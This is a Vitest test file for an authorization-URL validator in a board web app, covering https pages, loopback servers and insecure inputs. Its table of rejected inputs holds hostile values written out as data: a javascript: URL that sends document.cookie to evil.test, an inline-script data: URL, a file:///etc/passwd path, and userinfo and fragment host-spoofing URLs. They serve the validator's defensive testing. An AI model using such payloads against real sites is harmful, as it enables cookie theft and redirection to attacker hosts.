// @vitest-environment jsdom
import { afterEach, describe, expect, it } from "vitest";
import { resolveAuthorizationTarget } from "./authorizationUrl";

/**
 * PAP-17099 — the board's own copy of the endpoint gate. The shared validator is
 * tested exhaustively in `@paperclipai/shared`; what matters here is that the
 * board applies it, and that its loopback exception follows how the board itself
 * is served rather than being unconditional.
 */
function serveBoardOver(protocol: "http:" | "https:") {
  Object.defineProperty(window, "location", {
    configurable: true,
    value: { ...window.location, protocol },
  });
}

describe("resolveAuthorizationTarget", () => {
  afterEach(() => {
    // jsdom's default is a plaintext localhost board.
    serveBoardOver("http:");
  });

  it("accepts an https authorization page and reports its host", () => {
    expect(resolveAuthorizationTarget("https://auth.example.test/authorize?state=abc")).toEqual({
      ok: true,
      url: "https://auth.example.test/authorize?state=abc",
      host: "auth.example.test",
    });
  });

  it.each([
    "javascript:fetch('https://evil.test/'+document.cookie)",
    "data:text/html,<script>alert(document.domain)</script>",
    "file:///etc/passwd",
    "http://evil.test/authorize",
    "https://auth.example.test@evil.test/authorize",
    "https://auth.example.test/authorize#@evil.test",
    "not-a-url",
    "",
    null,
    undefined,
  ])("refuses %s with a message that does not echo it", (value) => {
    const target = resolveAuthorizationTarget(value);
    expect(target.ok).toBe(false);
    if (target.ok) return;
    expect(target.message.length).toBeGreaterThan(0);
    if (value) expect(target.message).not.toContain(value);
  });

  it("allows a loopback authorization server only on a plaintext-http board", () => {
    serveBoardOver("http:");
    expect(resolveAuthorizationTarget("http://127.0.0.1:8930/authorize").ok).toBe(true);

    serveBoardOver("https:");
    expect(resolveAuthorizationTarget("http://127.0.0.1:8930/authorize")).toEqual({
      ok: false,
      message: expect.stringContaining("secure"),
    });
    expect(resolveAuthorizationTarget("https://auth.example.test/authorize").ok).toBe(true);
  });
});
